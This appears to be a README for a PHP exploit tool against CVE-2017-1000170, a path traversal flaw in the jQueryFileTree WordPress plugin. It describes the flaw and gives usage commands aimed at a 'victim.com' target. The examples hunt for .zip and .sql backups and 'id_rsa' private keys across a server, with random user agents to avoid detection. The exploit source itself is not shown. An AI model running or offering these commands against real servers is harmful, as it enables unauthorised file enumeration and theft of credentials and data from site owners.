# Jquery-File-Tree-1.6.6-Path-Traversal
Jquery File Tree 1.6.6 Path Traversal exploit (CVE-2017-1000170)

The jQueryFileTree <1.6.6 plugin for Wordpress default settings fail to parse the user data causing a path traversal vulnerability.

This allows an attacker to list all the filesnames of all readable folders of the webserver. 

Added to a local file inclusion or local file disclosure attack this can lead to arbitrarily download any readable file of the server.

# Usage

`$ xpl_jqueryFileTree.php -u url [-f extensions/filenames] [-p path] [-r] [-h] [-a]`

Legend:
```
  -h, --help: Show this message
  -u, --url: URL of target
  -a, --random-agent: Use random user agents
  -f, --filter: Name of files or extensions to search for (separated by comma)
  -p, --path: The full path from which the filenames will be read (default: /)
  -r, --recursive: Generates the tree recursivelly (be careful)

  e.g.: xpl_jqueryFileTree.php -u victim.com -f .zip,.sql -p /var/www/html/backup/admin/ -r
        |
         \-> This will search for all .zip and .sql files inside victim.com/backup/admin and its subpaths
             (You must provide the dot to indicate it's an extension)

        xpl_jqueryFileTree.php -u victim.com -f .log,id_rsa -a -r
        |
         \-> This will search for all files named "id_rsa" or having the extension
             ".log" within all folders of the server, with random user-agents

        Tip: use "php ..... | tee output" to save the result to an output file
```

![](https://i.imgur.com/K2ITuMg.png)
